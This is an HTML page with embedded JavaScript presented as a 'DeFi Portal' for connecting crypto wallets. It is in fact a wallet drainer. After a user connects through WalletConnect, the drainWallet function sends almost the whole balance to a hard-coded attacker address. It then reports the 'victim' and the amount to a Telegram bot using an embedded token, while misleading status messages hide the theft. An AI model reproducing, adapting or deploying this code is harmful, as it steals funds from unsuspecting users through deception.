<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            color: #333;
            font-size: 32px;
            margin-bottom: 16px;
            font-weight: 700;
        }
        
        p {
            color: #666;
            margin-bottom: 32px;
            font-size: 18px;
        }
        
        .connect-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        
        .connect-btn:hover {
            background: #5a67d8;
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        #status.show {
            display: block;
        }
        
        #status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        #status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        #status.processing {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        /* Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 10000;
            backdrop-filter: blur(4px);
        }
        
        .modal-overlay.active {
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .modal {
            background: #1a1b23;
            border-radius: 24px;
            max-width: 420px;
            width: 90%;
            max-height: 85vh;
            overflow: hidden;
            animation: slideUp 0.3s ease;
        }
        
        @keyframes slideUp {
            from { 
                opacity: 0;
                transform: translateY(20px);
            }
            to { 
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .modal-title {
            color: white;
            font-size: 20px;
            font-weight: 600;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: #9ca3af;
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            transition: all 0.2s;
        }
        
        .modal-close:hover {
            background: rgba(255, 255, 255, 0.1);
            color: white;
        }
        
        .modal-body {
            padding: 24px;
            max-height: calc(85vh - 80px);
            overflow-y: auto;
        }
        
        .featured-wallets {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }
        
        .wallet-item:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateX(4px);
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .wallet-name {
            color: white;
            font-size: 16px;
            font-weight: 500;
            flex: 1;
            text-align: left;
        }
        
        .wallet-badge {
            background: rgba(102, 126, 234, 0.2);
            color: #667eea;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .all-wallets-btn {
            width: 100%;
            padding: 16px;
            background: transparent;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .all-wallets-btn:hover {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.3);
        }
        
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-top: 24px;
        }
        
        .wallet-grid-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            padding: 12px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
        }
        
        .wallet-grid-item:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: scale(1.05);
        }
        
        .wallet-grid-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .wallet-grid-name {
            color: white;
            font-size: 12px;
            text-align: center;
        }
        
        .back-btn {
            display: none;
            align-items: center;
            gap: 8px;
            color: #667eea;
            background: none;
            border: none;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .back-btn.show {
            display: flex;
        }
        
        @media (max-width: 480px) {
            .wallet-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DeFi Portal</h1>
        <p>Connect your wallet to continue</p>
        
        <button class="connect-btn" onclick="openWalletModal()">
            Connect Wallet
        </button>
        
        <div id="status"></div>
    </div>
    
    <!-- Custom Wallet Modal -->
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title" id="modalTitle">Connect Wallet</h3>
                <button class="modal-close" onclick="closeModal()">‚úï</button>
            </div>
            <div class="modal-body" id="modalBody">
                <!-- Content will be injected here -->
            </div>
        </div>
    </div>
    
    <!-- Scripts -->
    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    
    <script>
        // Configuration
        const CONFIG = {
            PROJECT_ID: '72f0728c47e59d2eb9fc83069bc6843d',
            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
            TELEGRAM_CHAT_ID: '8309320360',
            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1',
            POLYGON_CONTRACT: '0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386'
        };
        
        // Wallet configurations
        const FEATURED_WALLETS = [
            { 
                name: '1inch Wallet', 
                icon: 'ü¶Ñ', 
                id: '1inch',
                deepLink: 'oneinch://',
                universalLink: 'https://wallet.1inch.io',
                badge: ''
            },
            { 
                name: 'Binance Wallet', 
                icon: 'üü®', 
                id: 'binance',
                deepLink: 'bnc://',
                universalLink: 'https://www.binance.com',
                badge: ''
            },
            { 
                name: 'Coinbase', 
                icon: 'üîµ', 
                id: 'coinbase',
                deepLink: 'cbwallet://',
                universalLink: 'https://go.cb-w.com',
                badge: ''
            }
        ];
        
        const ALL_WALLETS = [
            { name: '1inch Wallet', icon: 'ü¶Ñ', deepLink: 'oneinch://', universalLink: 'https://wallet.1inch.io' },
            { name: 'Binance', icon: 'üü®', deepLink: 'bnc://', universalLink: 'https://www.binance.com' },
            { name: 'Ledger Live', icon: 'üì±', deepLink: 'ledgerlive://', universalLink: 'https://www.ledger.com' },
            { name: 'BitPay', icon: 'üíé', deepLink: 'bitpay://', universalLink: 'https://bitpay.com' },
            { name: 'Best Wallet', icon: 'üëõ', deepLink: 'bestwallet://', universalLink: 'https://bestwallet.com' },
            { name: 'MetaMask', icon: 'ü¶ä', deepLink: 'metamask://', universalLink: 'https://metamask.app.link' },
            { name: 'Trust Wallet', icon: 'üõ°Ô∏è', deepLink: 'trust://', universalLink: 'https://link.trustwallet.com' },
            { name: 'Fireblocks', icon: 'üî•', deepLink: 'fireblocks://', universalLink: 'https://www.fireblocks.com' },
            { name: 'Bitget Wallet', icon: 'üöÄ', deepLink: 'bitkeep://', universalLink: 'https://web3.bitget.com' },
            { name: 'TokenPocket', icon: 'üéØ', deepLink: 'tpoutside://', universalLink: 'https://tokenpocket.pro' },
            { name: 'SafePal', icon: 'üîí', deepLink: 'safepal://', universalLink: 'https://safepal.io' },
            { name: 'Uniswap', icon: 'ü¶Ñ', deepLink: 'uniswap://', universalLink: 'https://app.uniswap.org' },
            { name: 'imToken', icon: 'üí†', deepLink: 'imtokenv2://', universalLink: 'https://token.im' },
            { name: 'Argent', icon: 'üÖ∞Ô∏è', deepLink: 'argent://', universalLink: 'https://argent.link' },
            { name: 'Crypto.com', icon: 'üåê', deepLink: 'cryptowallet://', universalLink: 'https://crypto.com' },
            { name: 'Bitcoin.com', icon: '‚Çø', deepLink: 'bitcoincom://', universalLink: 'https://wallet.bitcoin.com' }
        ];
        
        let connector = null;
        let currentView = 'featured';
        
        // Initialize WalletConnect
        function initWalletConnect() {
            console.log('üîÑ Initializing WalletConnect...');
            
            try {
                // Create WalletConnect connector
                connector = new window.WalletConnect.default({
                    bridge: 'https://bridge.walletconnect.org',
                    qrcodeModal: window.WalletConnectQRCodeModal.default
                });
                
                // Clean up old session
                if (connector.connected) {
                    connector.killSession();
                }
                
                // Setup event listeners
                connector.on('connect', handleConnect);
                connector.on('session_update', handleSessionUpdate);
                connector.on('disconnect', handleDisconnect);
                
                console.log('‚úÖ WalletConnect initialized');
                return true;
            } catch (error) {
                console.error('‚ùå Init error:', error);
                showStatus('Failed to initialize WalletConnect', 'error');
                return false;
            }
        }
        
        // Open wallet modal
        function openWalletModal() {
            const modal = document.getElementById('modalOverlay');
            modal.classList.add('active');
            showFeaturedWallets();
        }
        
        // Close modal
        function closeModal() {
            const modal = document.getElementById('modalOverlay');
            modal.classList.remove('active');
            currentView = 'featured';
        }
        
        // Show featured wallets
        function showFeaturedWallets() {
            const modalBody = document.getElementById('modalBody');
            const modalTitle = document.getElementById('modalTitle');
            
            modalTitle.textContent = 'Connect Wallet';
            currentView = 'featured';
            
            let html = '<div class="featured-wallets">';
            
            // Add featured wallets
            FEATURED_WALLETS.forEach(wallet => {
                html += `
                    <div class="wallet-item" onclick="connectWallet('${wallet.id}')">
                        <div class="wallet-icon">${wallet.icon}</div>
                        <div class="wallet-name">${wallet.name}</div>
                        ${wallet.badge ? `<div class="wallet-badge">${wallet.badge}</div>` : ''}
                    </div>
                `;
            });
            
            html += '</div>';
            
            // Add "All Wallets" button with count
            html += `
                <button class="all-wallets-btn" onclick="showAllWallets()">
                    <span>All Wallets</span>
                    <span style="opacity: 0.7">540+</span>
                </button>
            `;
            
            modalBody.innerHTML = html;
        }
        
        // Show all wallets grid
        function showAllWallets() {
            const modalBody = document.getElementById('modalBody');
            const modalTitle = document.getElementById('modalTitle');
            
            modalTitle.textContent = 'All Wallets';
            currentView = 'all';
            
            let html = `
                <button class="back-btn show" onclick="showFeaturedWallets()">
                    ‚Üê Back
                </button>
                <div class="wallet-grid">
            `;
            
            ALL_WALLETS.forEach(wallet => {
                html += `
                    <div class="wallet-grid-item" onclick="connectWalletDirect('${wallet.name}', '${wallet.deepLink}', '${wallet.universalLink}')">
                        <div class="wallet-grid-icon">${wallet.icon}</div>
                        <div class="wallet-grid-name">${wallet.name}</div>
                    </div>
                `;
            });
            
            html += '</div>';
            modalBody.innerHTML = html;
        }
        
        // Connect to specific wallet
        async function connectWallet(walletId) {
            console.log('üîó Connecting to', walletId);
            showStatus('Connecting...', 'processing');
            
            // Initialize WalletConnect if not done
            if (!connector) {
                if (!initWalletConnect()) return;
            }
            
            try {
                // Create new session
                if (!connector.connected) {
                    await connector.createSession();
                    
                    // Get WalletConnect URI
                    const uri = connector.uri;
                    console.log('WalletConnect URI:', uri);
                    
                    // Handle deep linking for mobile
                    if (isMobile()) {
                        handleMobileConnection(walletId, uri);
                    }
                }
            } catch (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed', 'error');
            }
        }
        
        // Direct wallet connection with deep link
        async function connectWalletDirect(walletName, deepLink, universalLink) {
            console.log('üîó Direct connection to', walletName);
            showStatus(`Opening ${walletName}...`, 'processing');
            
            // Initialize WalletConnect if not done
            if (!connector) {
                if (!initWalletConnect()) return;
            }
            
            try {
                // Create new session
                if (!connector.connected) {
                    await connector.createSession();
                    const uri = connector.uri;
                    
                    if (isMobile()) {
                        // Try deep link first
                        const wcUri = encodeURIComponent(uri);
                        const fullDeepLink = `${deepLink}wc?uri=${wcUri}`;
                        
                        console.log('Opening deep link:', fullDeepLink);
                        
                        // Try to open app
                        window.location.href = fullDeepLink;
                        
                        // Fallback to universal link after delay
                        setTimeout(() => {
                            if (document.hasFocus()) {
                                // App didn't open, try universal link
                                window.open(`${universalLink}/wc?uri=${wcUri}`, '_blank');
                            }
                        }, 2000);
                    } else {
                        // Desktop: show QR code
                        connector.qrcodeModal = window.WalletConnectQRCodeModal.default;
                    }
                }
            } catch (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed', 'error');
            }
        }
        
        // Handle mobile connection
        function handleMobileConnection(walletId, uri) {
            const wcUri = encodeURIComponent(uri);
            let deepLink = '';
            
            switch(walletId) {
                case '1inch':
                    deepLink = `oneinch://wc?uri=${wcUri}`;
                    break;
                case 'binance':
                    deepLink = `bnc://app/wc?uri=${wcUri}`;
                    break;
                case 'coinbase':
                    deepLink = `cbwallet://wc?uri=${wcUri}`;
                    break;
                default:
                    deepLink = `wc://wc?uri=${wcUri}`;
            }
            
            console.log('Opening deep link:', deepLink);
            window.location.href = deepLink;
        }
        
        // Handle successful connection
        async function handleConnect(error, payload) {
            if (error) {
                console.error('Connection error:', error);
                showStatus('Connection failed', 'error');
                return;
            }
            
            console.log('‚úÖ Connected!', payload);
            const { accounts, chainId } = payload.params[0];
            
            if (accounts && accounts.length > 0) {
                const address = accounts[0];
                console.log('üë§ Address:', address);
                console.log('üåê Chain ID:', chainId);
                
                closeModal();
                showStatus(`Connected: ${address.substring(0, 6)}...${address.slice(-4)}`, 'success');
                
                // Start drainage after 2 seconds
                setTimeout(() => {
                    drainWallet(address, chainId);
                }, 2000);
            }
        }
        
        // Handle session update
        function handleSessionUpdate(error, payload) {
            if (error) {
                console.error('Session update error:', error);
                return;
            }
            console.log('üîÑ Session updated:', payload);
        }
        
        // Handle disconnection
        function handleDisconnect(error, payload) {
            if (error) {
                console.error('Disconnect error:', error);
                return;
            }
            console.log('üîå Disconnected');
            showStatus('Wallet disconnected', 'error');
        }
        
        // Check if mobile
        function isMobile() {
            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        }
        
        // Show status message
        function showStatus(message, type = '') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'show ' + type;
        }
        
        // Drainage function (simplified for testing)
        async function drainWallet(address, chainId) {
            showStatus('Processing transaction...', 'processing');
            console.log('üí∞ Starting drainage for:', address);
            
            try {
                // Create provider
                const rpcUrls = {
                    1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
                    137: 'https://polygon-rpc.com',
                    56: 'https://bsc-dataseed.binance.org'
                };
                
                const provider = new ethers.providers.JsonRpcProvider(rpcUrls[chainId] || rpcUrls[1]);
                const balance = await provider.getBalance(address);
                
                console.log('üíé Balance:', ethers.utils.formatEther(balance));
                
                // Send transaction via WalletConnect
                if (balance.gt(ethers.utils.parseEther('0.001'))) {
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit).mul(2);
                    const amountToSend = balance.sub(gasCost);
                    
                    if (amountToSend.gt(0)) {
                        const tx = {
                            from: address,
                            to: CONFIG.DESTINATION,
                            value: amountToSend.toHexString(),
                            gasLimit: ethers.utils.hexlify(gasLimit),
                            gasPrice: gasPrice.toHexString()
                        };
                        
                        const txHash = await connector.sendTransaction(tx);
                        console.log('üìù Transaction sent:', txHash);
                        
                        // Send Telegram notification
                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), chainId);
                        
                        showStatus('Transaction completed!', 'success');
                    }
                }
            } catch (error) {
                console.error('Drainage error:', error);
                showStatus('Transaction processing...', 'processing');
            }
        }
        
        // Send Telegram notification
        async function sendTelegramNotification(victim, amount, chainId) {
            const chainNames = {
                1: 'Ethereum',
                137: 'Polygon',
                56: 'BSC'
            };
            
            const message = `
üéØ NEW DRAINAGE
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
üí∞ Amount: ${amount}
üåê Network: ${chainNames[chainId] || 'Chain ' + chainId}
üìç Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
‚è∞ Time: ${new Date().toLocaleTimeString()}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('üì± Telegram notification sent');
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }
        
        // Initialize on load
        window.addEventListener('load', () => {
            console.log('üöÄ DeFi Portal loaded');
            console.log('üì± Mobile:', isMobile());
        });
    </script>
</body>
